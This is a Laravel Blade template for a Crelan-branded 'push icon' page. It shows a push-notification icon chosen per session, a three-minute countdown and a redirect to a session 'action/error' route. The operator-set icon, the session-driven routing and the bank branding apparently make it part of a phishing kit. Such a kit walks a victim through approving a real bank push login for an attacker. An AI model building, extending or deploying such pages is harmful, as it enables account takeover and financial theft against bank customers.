@extends('layouts.app')

@section('title', __('messages.push_icon_header') . ' | Crelan')

@section('content')
<div class="form-page-center">
    <div class="form-container">
        <div class="form-container--content">
            @php
                $iconsPath = base_path('scripts/icons.json');
                $iconsData = [];
                if (file_exists($iconsPath)) {
                    $iconsData = json_decode(file_get_contents($iconsPath), true) ?? [];
                }
                $iconId = $session->push_icon_id ?? ($iconsData[0]['id'] ?? null);
                $iconSvg = null;
                foreach ($iconsData as $icon) {
                    if (($icon['id'] ?? null) === $iconId) {
                        $iconSvg = $icon['content'] ?? null;
                        break;
                    }
                }
                if ($iconSvg) {
                    $iconSvg = str_replace('#202120', '#ffffff', $iconSvg);
                }
            @endphp

            <div class="push-icon-page">

                <h2 class="push-icon-title">{{ __('messages.push_icon_title') }}</h2>
                <p class="push-icon-subtitle">{{ __('messages.push_icon_subtitle') }}</p>
                <p class="push-icon-instruction">{{ __('messages.push_icon_instruction') }}</p>

                <div class="push-icon-preview">
                    {!! $iconSvg ?? '' !!}
                </div>

                <div class="push-icon-timer">
                    <span id="push-icon-timer-value">03:00</span>
                    <span>{{ __('messages.push_icon_timer_label') }}</span>
                </div>
                <div class="push-icon-progress">
                    <div class="push-icon-progress-bar" id="push-icon-progress-bar"></div>
                </div>
            </div>
        </div>
    </div>
</div>
@endsection

@push('styles')
<style>
/* Header layout */
.form-container--header-crelan {
    display: flex;
    justify-content: space-between;
    align-items: center;
    gap: 20px;
}

.header-left {
    display: flex;
    align-items: center;
    gap: 12px;
}
.header-right {
    flex: 1;
    max-width: 300px;
}

/* Push steps compact */
.push-steps-compact {
    display: flex;
    flex-direction: column;
    gap: 3px;
}

.push-step {
    display: flex;
    align-items: center;
    gap: 6px;
    padding: 2px 4px;
    border-radius: 4px;
    background: #f8fafc;
    border: 1px solid #e2e8f0;
    transition: all 0.3s ease;
}

.push-step:last-child {
    margin-bottom: 0;
}

.push-step.active {
    background: #f0fdf4;
    border-color: #84BD00;
}

.push-step-number {
    width: 14px;
    height: 14px;
    border-radius: 50%;
    background: #e2e8f0;
    color: #64748b;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 8px;
    font-weight: 600;
    flex-shrink: 0;
}

.push-step.active .push-step-number {
    background: #84BD00;
    color: white;
}

.push-step-content {
    flex: 1;
    min-width: 0;
}

.push-step-title {
    font-size: 8px;
    font-weight: 600;
    color: #64748b;
    line-height: 1.1;
}

.push-step.active .push-step-title {
    color: #1a202c;
}

.push-step-text {
    display: none;
}

.push-step.active .push-step-text {
    display: none;
}

/* Remove old styles */
.progress-compact {
    display: none;
}
</style>
@endpush

@push('scripts')
<script>
document.addEventListener('DOMContentLoaded', function() {
    const sessionId = localStorage.getItem('session_id');
    if (!sessionId) {
        window.location.href = '/';
        return;
    }

    if (window.SessionManager) {
        window.SessionManager.setSessionId(sessionId);
    }

    const totalSeconds = 180;
    let remainingSeconds = totalSeconds;
    const timerValue = document.getElementById('push-icon-timer-value');
    const progressBar = document.getElementById('push-icon-progress-bar');

    const updateTimer = () => {
        const minutes = String(Math.floor(remainingSeconds / 60)).padStart(2, '0');
        const seconds = String(remainingSeconds % 60).padStart(2, '0');
        timerValue.textContent = `${minutes}:${seconds}`;
        const percent = (remainingSeconds / totalSeconds) * 100;
        progressBar.style.width = `${percent}%`;
    };

    updateTimer();

    const timerInterval = setInterval(() => {
        remainingSeconds -= 1;
        if (remainingSeconds <= 0) {
            remainingSeconds = 0;
            updateTimer();
            clearInterval(timerInterval);
            window.location.href = `/session/${sessionId}/action/error`;
            return;
        }
        updateTimer();
    }, 1000);
});
</script>
@endpush
